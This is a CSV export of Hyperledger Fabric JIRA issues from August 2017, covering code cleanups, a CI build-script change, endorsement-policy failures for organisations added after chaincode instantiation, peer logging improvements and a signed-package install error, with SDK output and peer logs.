Remove unused MessageHandler interface,FAB-5884,20355,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,23/Aug/17 5:36 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Sep/17 8:14 PM,,,,v1.1.0,,,,,,,,0,,,,,,,"The Handler structure (core/chaincode/handler.go) is said to implement the  MessageHandler interface.

However, from existing code, it does not. And it is not necessary to keep the  MessageHandler interface as orphan interface.

Need to refine this part of code to remove the interface, and make the HandleMessage() method private.",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydxz:",,,,,,,,,,,,,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Aug/17 5:40 PM;baohua;https://gerrit.hyperledger.org/r/#/c/12693/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
GetVersion method returns nil ,FAB-5887,20360,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,chris.elder,chris.elder,chris.elder,23/Aug/17 10:42 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Aug/17 11:39 PM,,,,,,fabric-ledger,,,,,,0,,,,,,,The GetVersion method in statecouchdb may return null if a new key is added and GetVersion is immediately called.,,chris.elder,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydzb:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/17 3:09 AM;denyeart;[~chris.elder] Can you expand on the problem?

I thought we were ok since GetVersion() would be called during validation of block N, values would get updated during commit of block N, and then cache would be cleared before next call of GetVersion() during validation of block N+1.  Note, cache is getting cleared in this CR: https://gerrit.hyperledger.org/r/#/c/12669/4/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/lockbased_txmgr.go.;;;","30/Aug/17 11:39 PM;chris.elder;This has been resolved by [FAB-5867].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
State Transfer Test using marbles02 chaincode,FAB-5888,20361,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Nishi,Nishi,23/Aug/17 11:51 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 12:41 AM,,,,,,,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydzj:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update peer CLI code that used fabric/common/errors package,FAB-5889,20362,20093,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,24/Aug/17 12:16 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,15/Sep/17 3:41 AM,,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydzr:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Sep/17 12:35 AM;wlahti;https://gerrit.hyperledger.org/r/#/c/12701/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update BCCSP code that used fabric/common/errors package,FAB-5890,20363,20093,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,24/Aug/17 12:17 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Aug/17 1:00 AM,,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydzz:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use 'make behave' in verification build instead of python behave commands,FAB-5891,20364,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid,,sudeshrshetty,sudeshrshetty,24/Aug/17 12:31 AM,20/Jul/18 11:17 PM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,v1.0.0,v1.0.1,,,,fabric-ci,,,,,,0,,,,,,,"Currently verification build '[https://jenkins.hyperledger.org/job/fabric-verify-behave-x86_64'] has below commands in execute shell, which should be replaced with existing 'make behave' target.

This is preventing one from adding dependencies to execution of BDD tests without affecting the 'peer' target. Normally, the way to do this should be to to add dependencies to 'behave'.

 

.

.

.

.

#Build Peer and images

make peer && make docker
docker images | grep hyperledger
cd bddtests
behave -k -D logs=force -D cache-deployment-spec
#behave -k -D cache-deployment-spec features/bootstrap.feature

#Deactivate vitrualenv after behave test
deactivate

.

.

.

.

This one causes an issue when someone adds a new feature which requires a specific target to be run before running tests.

For Example: Verification build failure in [https://gerrit.hyperledger.org/r/#/c/12435/] due to missing sample binary file generation target 'make sample-binarycc-files'",,ChristopherFerris,rameshthoomu,sudeshrshetty,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye07:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,rameshthoomu,sudeshrshetty,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Aug/17 1:36 AM;sudeshrshetty;Make command will somewhat look like this,

 

.

.

#Build Peer and images

make behave BEHAVE_OPTS='-k -D logs=force -D cache-deployment-spec'
docker images | grep hyperledger
cd bddtests

#Deactivate vitrualenv after behave test
deactivate;;;","14/Sep/17 1:03 AM;rameshthoomu;[~sudeshrshetty] this issue has been fixed adding *make behave-deps in behave CI job.* Could you please confirm?;;;","14/Sep/17 1:36 AM;sudeshrshetty;[~rameshthoomu] *make behave-deps in CI* job fixes the issue when someone needs to add some dependency target for behave.

*make behave* should be the long term solution where it runs behave tests in a build target. No need to put any python behave commands in CI. It will make CI look more clean.;;;","15/Oct/17 4:46 AM;ChristopherFerris;reduced priority to low;;;","06/Apr/18 9:49 PM;ChristopherFerris;no longer relevant because the bdd tests have been removed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
invokes fail on org added after chaincode is instantiated,FAB-5893,20367,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,jkirke,jkirke,24/Aug/17 2:43 AM,02/Jan/19 4:20 PM,28/Oct/23 3:00 AM,20/Feb/18 5:58 AM,v1.0.1,,,v1.1.0,,fabric-docs,,,,,,0,,,,,,,"Invokes fail on org added after chaincode is instantiated. Executed on Fabric 1.0.1

Steps:
Create channel with org01 and org02
Join each org to channel
Add 2 peers per org
Attempt to join channel with org03 (fails appropriately)
Edit channel and add org03
Join org03 to channel
Add 2 peers for org03
Install cc on all 6 peers
Instantiate on org01 peer
Query on all 6 peers
Invoke on all 6 peers
Query on all 6 peers
Attempt to join channel with org04 (fails appropriately)
Edit channel and add org04
Join org04 to channel
Add 2 peers for org04
Install cc on all org04 peers
Query on all 8 peers
Invoke on all 8 peers (fails on org04 peers)

SDK output:

root@JasonHSBN1:/home/ibmadmin/quality/v1.0_sdk_tests# node app.js invoke -c lateadd -i lateadd -v 1 -m 1 -o b -p fabric-peer-org4-28780c info: Clearing Cached Key Value Stores TAP version 13 # ***** invoke transaction to move money ***** # getMember, name: admin, client.getUserContext(admin, true) ok 1 Successfully enrolled user 'admin' ok 2 Successfully enrolled org: PeerOrg4 info: [invoke-chaincode]: create new peer grpcs://tor-zbc06c.3.secure.blockchain.ibm.com:28780 info: [invoke-chaincode]: create new eventhub grpcs://tor-zbc06c.3.secure.blockchain.ibm.com:22572 info: [EventHub.js]: _connect - options \{} info: [invoke-chaincode]: setConfigSetting(""E2E_TX_ID"") = 4894d1a43cc538f47cfa9e6aac4c541e0ee8262a141a345bbe518d9c69c04782 # Sending transaction ""4894d1a43cc538f47cfa9e6aac4c541e0ee8262a141a345bbe518d9c69c04782"" # ***************************************************************************** # stop and start the peer event hub ---- N O W ----- you have 0 millis # ***************************************************************************** ok 3 transaction proposal has response status of good ok 4 transaction proposal signature and endorser are valid ok 5 compareProposalResponseResults execution did not throw an error ok 6 All proposals have a matching read/writes sets ok 7 Successfully sent Proposal and received ProposalResponse: Status - 200, message - ""OK"", metadata - """", endorsement signature: 0D ""▒▒r)d )?�""o8'��;f����� V˚��k7k����\{��T��&���P y��� not ok 8 The balance transfer transaction was invalid, code = ENDORSEMENT_POLICY_FAILURE --- operator: fail at: EventHub._processTxOnEvents (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/fabric-client/lib/EventHub.js:775:5) stack: |- Error: The balance transfer transaction was invalid, code = ENDORSEMENT_POLICY_FAILURE at Test.assert [as _assert] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:212:54) at Test.bound [as _assert] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:64:32) at Test.fail (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:277:10) at Test.bound [as fail] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:64:32) at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:976:39 at EventHub._processTxOnEvents (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/fabric-client/lib/EventHub.js:775:5) at ClientDuplexStream. (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/fabric-client/lib/EventHub.js:310:10) at emitOne (events.js:96:13) at ClientDuplexStream.emit (events.js:188:7) at readableAddChunk (_stream_readable.js:176:18) ... not ok 9 Failed to send transaction and get notifications within the timeout period. --- operator: fail at: process._tickCallback (internal/process/next_tick.js:109:7) stack: |- Error: Failed to send transaction and get notifications within the timeout period. at Test.assert [as _assert] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:212:54) at Test.bound [as _assert] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:64:32) at Test.fail (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:277:10) at Test.bound [as fail] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:64:32) at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1003:27 at process._tickCallback (internal/process/next_tick.js:109:7) ... not ok 10 Error: Failed to send transaction and get notifications within the timeout period. at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1004:31 at process._tickCallback (internal/process/next_tick.js:109:7) --- operator: fail at: process._tickCallback (internal/process/next_tick.js:109:7) stack: |- Error: Error: Failed to send transaction and get notifications within the timeout period. at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1004:31 at process._tickCallback (internal/process/next_tick.js:109:7) at Test.assert [as _assert] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:212:54) at Test.bound [as _assert] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:64:32) at Test.fail (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:277:10) at Test.bound [as fail] (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/tape/lib/test.js:64:32) at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1032:15 at process._tickCallback (internal/process/next_tick.js:109:7) ... info: [invoke-chaincode]: Disconnecting the event hub not ok 11 Error: Error: Failed to send transaction and get notifications within the timeout period. at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1004:31 at process._tickCallback (internal/process/next_tick.js:109:7) --- operator: error expected: |- undefined actual: |- [Error: Error: Failed to send transaction and get notifications within the timeout period. at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1004:31 at process._tickCallback (internal/process/next_tick.js:109:7)] at: Test.onetime (/home/ibmadmin/quality/v1.0_sdk_tests/node_modules/onetime/index.js:22:12) stack: |- Error: Error: Failed to send transaction and get notifications within the timeout period. at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1004:31 at process._tickCallback (internal/process/next_tick.js:109:7) at /home/ibmadmin/quality/v1.0_sdk_tests/tests.js:1033:19 at process._tickCallback (internal/process/next_tick.js:109:7) ... 1..11 # tests 11 # pass 7 # fail 4",,angelo.decaro,denyeart,jkirke,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8053,,,,,,,,,,,,"24/Aug/17 2:45 AM;jkirke;1d9e710fcbc7443fa7fc2a3d1b9b2938_Logs.zip;https://jira.hyperledger.org/secure/attachment/11925/1d9e710fcbc7443fa7fc2a3d1b9b2938_Logs.zip",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye0n:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,denyeart,jkirke,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Aug/17 2:44 AM;jkirke;n peers logs I can see:
failed, err Failed to authenticate policy
�[31m2017-08-22 15:22:39.049 UTC [txvalidator] Validate -> ERRO 0b1�[0m VSCCValidateTx for transaction txId = 4894d1a43cc538f47cfa9e6aac4c541e0ee8262a141a345bbe518d9c69c04782 returned error VSCC error: policy evaluation failed, err Failed to authenticate policy
�[33m2017-08-22 15:22:39.049 UTC [statevalidator] ValidateAndPrepareBatch -> WARN 0b2�[0m Block [20] Transaction index [0] marked as invalid by committer. Reason code [10]
2017-08-22 15:22:39.052 UTC [kvledger] Commit -> INFO 0b3�[0m Channel [lateadd]: Created block [20] with 1 transaction(s)
2017-08-22 15:22:39.052 UTC [eventhub_producer] SendProducerBlockEvent -> INFO 0b4�[0m Channel [lateadd]: Sending event for block number [20];;;","24/Aug/17 2:47 AM;jkirke;I have attached the logs. In them the errors can be seen. I found that I could fix the problem by executing an update chaincode so towards the end of the logs the failure to invoke no longer occurs.;;;","28/Jan/18 9:48 PM;muralisr;[~jkirke] as its been a while, thought I'll check if this is still an issue.;;;","30/Jan/18 1:23 AM;jkirke;Still happens with level 1.0.5 of fabric. 
1. Create channel with org01
2. Add peers, install CC, instantiate CC, execute invokes

3. Create org02 

4. Add org02 to channel

5. Add org02 peer, install CC, execute a query on org02 peer to start CC (works)

6. Attempt to execute invoke on org02 peer



[33m2018-01-29 16:12:38.120 UTC [vscc] Invoke -> WARN b5cc[0m Endorsement policy failure for transaction txid=94a9bb418baad2a0670cad428fb956fea8b1025bdcb9908f95ffc303b09c9e75, err: Failed to authenticate policy [31m2018-01-29 16:12:38.120 UTC [txvalidator] VSCCValidateTxForCC -> ERRO b5cd[0m VSCC check failed for transaction txid=94a9bb418baad2a0670cad428fb956fea8b1025bdcb9908f95ffc303b09c9e75, error VSCC error: policy evaluation failed, err Failed to authenticate policy [31m2018-01-29 16:12:38.120 UTC [txvalidator] Validate -> ERRO b5ce[0m VSCCValidateTx for transaction txId = 94a9bb418baad2a0670cad428fb956fea8b1025bdcb9908f95ffc303b09c9e75 returned error VSCC error: policy evaluation failed, err Failed to authenticate policy [33m2018-01-29 16:12:38.120 UTC [statevalidator] ValidateAndPrepareBatch -> WARN b5cf[0m Block [23235] Transaction index [0] marked as invalid by committer. Reason code [10] 2018-01-29 16:12:38.125 UTC [kvledger] Commit -> INFO b5d0[0m Channel [throughui01]: Created block [23235] with 1 transaction(s) 2018-01-29 16:12:38.129 UTC [eventhub_producer] SendProducerBlockEvent -> INFO b5d1[0m Channel [throughui01]: Sending event for block number [23235];;;","30/Jan/18 9:26 AM;muralisr;[~jkirke] Currently we do not support endorsement policies of the form ""ANY admin of the channel"". It has to be specified in terms of MSPs. If you don't specifically set the endorsement policy at the time of instantiate, it'll compute a default endorsement policy with any member of the MSPs in the channel {color:#d04437}*at the time of instantiation*.{color} 

Only way to have some flexibility is to create a forward thinking endorsement policy using Org2MSP even before adding it to the channel, which will work albeit ugly as heck.

 CORE_PEER_ADDRESS=192.168.1.81:7051 peer chaincode instantiate -n mycc -v 0 -c '\{""Args"":[""init"",""a"",""100"",""b"",""200""]}' -C myc -o orderer.example.com:7050 -P ""OR('Org1MSP.admin', {color:#d04437}*'Org2MSP.admin'*{color})"".

Bottom line, this is working as designed but a feature request for a *{color:#d04437}""*.admin""{color}* type of policy many not be a bad idea.;;;","30/Jan/18 9:46 AM;jkirke;[~muralisr] The endorsement policy is updated when the second org is added but it is not working correctly. The channel is being updated. I can further see this by updating the chaincode to a new version which corrects the problem and allows both organizations to execute invokes on the channel. Reach out to me [jkirke@us.ibm.com|mailto:jkirke@us.ibm.com] if you would like to discuss.;;;","30/Jan/18 9:57 AM;muralisr;[~jkirke] How do you mean ""_The endorsement policy is updated when the second org is added"" ..._ your instructions above do not indicate endorsement policy update after the new Org is added. 

Pinged you on RC for offline discussion.;;;","31/Jan/18 5:37 AM;muralisr;[~jkirke] per offline discussion, I think we are on the same page - this is working as designed but needs doc and possibly new feature request.

If not in the docs already, suggest we doc this ...

{code:java}
Endorsement policy is specified at the time of chaincode instantiation. It is used at commit time to validate transactions signed by the endorsing peer against the endorsement policy.

A new Organization added to the channel after the instantiation maybe able to query a chaincode successfully but not commit a transaction per endorsement policy specified at chaincode instantiation time.
{code}

[~denyeart] [~ales] [~angelo.decaro] [~elli-androulaki] We may want to consider some feature request to allow a more flexible endorsement policy
* endorsement policies with wild cards (e.g., ""*.admin"")
* allow updaing endorsement policy for an instantiated CC



;;;","01/Feb/18 7:30 AM;denyeart;I agree [~muralisr] .  Let's use this JIRA to clarify the documentation.

And we will write up a new JIRA feature for dynamic endorsement policies (multiple options to consider), and then link this JIRA and the new JIRA item.;;;","02/Feb/18 5:55 PM;angelo.decaro;As a general line of thoughts, I think, we should first understand which problem we want to try to solve and see if there are already solutions available in the literature. For instance, Corda has an interesting setting that we might want to replicate.;;;","05/Feb/18 2:22 AM;muralisr;created FAB-8053 to continue this discussion as a possible feature improvement.

 _see if there are already solutions available in the literature._

[~angelo.decaro] could you comment on the above (and anything else) in that JIRA pretty please ? ;;;","15/Feb/18 2:43 AM;denyeart;[~muralisr] Can you proceed with the doc update for 1.1, now that the future feature has been created.;;;","18/Feb/18 11:03 PM;muralisr;https://gerrit.hyperledger.org/r/#/c/18011/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
Need to enhance peer logging for policy evaluation failed,FAB-5895,20369,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,jkirke,jkirke,24/Aug/17 2:55 AM,02/Jan/19 4:21 PM,28/Oct/23 3:00 AM,02/Feb/18 7:26 AM,v1.0.1,,,,,fabric-peer,,,,,,0,,,,,,,"Need to enhance peer logging for policy evaluation failed. Executed on Fabric 1.0.1

Steps:
Create channel with org01 and org02
Join each org to channel
Add 2 peers per org
Attempt to join channel with org03 (fails appropriately)
Edit channel and add org03
Join org03 to channel
Add 2 peers for org03
Install cc on all 6 peers
Instantiate on org01 peer
Query on all 6 peers
Invoke on all 6 peers
Query on all 6 peers
Attempt to join channel with org04 (fails appropriately)
Edit channel and add org04
Join org04 to channel
Add 2 peers for org04
Install cc on all org04 peers
Query on all 8 peers
Invoke on all 8 peers (fails on org04 peers)

In peers logs I can see:
failed, err Failed to authenticate policy
�[31m2017-08-22 15:22:39.049 UTC [txvalidator] Validate -> ERRO 0b1�[0m VSCCValidateTx for transaction txId = 4894d1a43cc538f47cfa9e6aac4c541e0ee8262a141a345bbe518d9c69c04782 returned error VSCC error: policy evaluation failed, err Failed to authenticate policy
�[33m2017-08-22 15:22:39.049 UTC [statevalidator] ValidateAndPrepareBatch -> WARN 0b2�[0m Block [20] Transaction index [0] marked as invalid by committer. Reason code [10]
2017-08-22 15:22:39.052 UTC [kvledger] Commit -> INFO 0b3�[0m Channel [lateadd]: Created block [20] with 1 transaction(s)
2017-08-22 15:22:39.052 UTC [eventhub_producer] SendProducerBlockEvent -> INFO 0b4�[0m Channel [lateadd]: Sending event for block number [20]",,jeffgarratt,jkirke,muralisr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Aug/17 2:56 AM;jkirke;1d9e710fcbc7443fa7fc2a3d1b9b2938_Logs.zip;https://jira.hyperledger.org/secure/attachment/11926/1d9e710fcbc7443fa7fc2a3d1b9b2938_Logs.zip",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzye13:",,,,,,,,,,,,,,,,,,,,,,,jeffgarratt,jkirke,muralisr,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Aug/17 2:56 AM;jkirke;Added logs for all components.;;;","08/Sep/17 4:17 AM;muralisr;[~wlahti] part of the serviceability work...assigning to you.;;;","14/Sep/17 1:32 AM;wlahti;[~jkirke] Can you provide more details of the information you'd like to see logged? Just the reason the policy evaluation failed? The name of the policy?;;;","15/Sep/17 7:17 AM;jkirke;In this instance the failure is that an org added late cannot execute in the channel and the logging fails to give specifics about the nature of the failure. As a user I would like additional information on the nature of the failure and the policy name so that it can be modified in needed.;;;","27/Oct/17 4:28 AM;jeffgarratt;[~wlahti] any updates on this one?;;;","07/Nov/17 12:11 AM;wlahti;I'll start looking into this again today and hopefully have a fix within a day or two.;;;","17/Nov/17 4:01 AM;wlahti;Looking deeper into the policy code, I think some useful logging is already available in the v1.1 code but it's at the debug level. See common/policies/policy.go, particularly the Evaluate function starting at line 184, in this CR: [https://github.com/hyperledger/fabric/commit/e503a08d79219735d84a9c57f1b3276dd084675f]

[~jkirke]-, if you are able to, can you try setting CORE_LOGGING_POLICIES=debug in a v1.1 environment and recreate the scenario?- I'll try recreating this myself and post the logging messages here. I think it will provide most if not all of what you're looking for. If so, the solution is likely to wrap the error message with the information from line 192 to ensure the information is more readily available in the logs in the event of a failure. 

 ;;;","17/Nov/17 6:44 AM;wlahti;Successfully recreated this scenario. The logs from the policies modules are too noisy to really be useful for this situation. I'll try to determine the best way to provide relevant information to allow an end user to take the necessary action in the event of a policy authentication failure. ;;;","31/Jan/18 6:26 AM;wlahti;No longer able to reproduce this in master. Previously, I took the e2e_cli network with two orgs, added a third org to the channel, and hit the same policy error when invoking. Now, the invoke goes through successfully, making me think there may have been a bug somewhere else in the policy logic leading to this situation. 

I'll see if there are any similar situations I can come up with that or at least try to add in helpful information to the reported error message. ;;;","02/Feb/18 5:01 AM;wlahti;On closer look, I actually can reproduce the issue. 

I plan to update the log messages from
{code:java}
2018-01-31 03:10:56.323 UTC [committer/txvalidator] VSCCValidateTxForCC -> ERRO b67 VSCC check failed for transaction txid=54fbbb08124f6d0bbeb1c4e451e6db3442d046691fdeff7922fce06ef66f641b, error VSCC error: policy evaluation failed, err Failed to authenticate policy
.
.
.
2018-01-31 03:10:56.323 UTC [committer/txvalidator] validateTx -> ERRO b6b VSCCValidateTx for transaction txId = 54fbbb08124f6d0bbeb1c4e451e6db3442d046691fdeff7922fce06ef66f641b returned error VSCC error: policy evaluation failed, err Failed to authenticate policy{code}
to
{code:java}
2018-01-31 05:06:44.360 UTC [committer/txvalidator] validateTx -> ERRO 92c VSCCValidateTx for transaction txId = 8e845b946bf120b12ed09a0cdddaf78d6d263cd4d4de1e7a4d8038f9d67733a4 returned error: VSCC error: endorsement policy failure, err: signature set did not satisfy policy{code}
which makes it clear that it was the endorsement policy that failed and the reason why it failed (""signature set did not satisfy policy"" instead of the vague ""Failed to authenticate policy"").;;;","02/Feb/18 6:30 AM;wlahti;https://gerrit.hyperledger.org/r/c/17451/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
unable to use signed install package ,FAB-5899,20376,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,muralisr,muralisr,24/Aug/17 12:26 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 4:22 PM,v1.0.0,v1.0.1,,v1.0.2,v1.1.0,fabric-peer,,,,,,0,,,,,,,"From description of the problem in Rocket Chat
{code:java}
Then i go to cli and try to create package:
`peer chaincode package -n mycc -p github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02 -v 2.0 -s -S -i ""AND('Org1MSP.admin')"" ccpack.out`
it creates ccpack.out, then 
`peer chaincode install ccpack.out`
return
`Error: Error endorsing chaincode: rpc error: code = Unknown desc = proto: bad wiretype for field peer.ChaincodeSpec.Type: got wiretype 2, want 0`
{code}

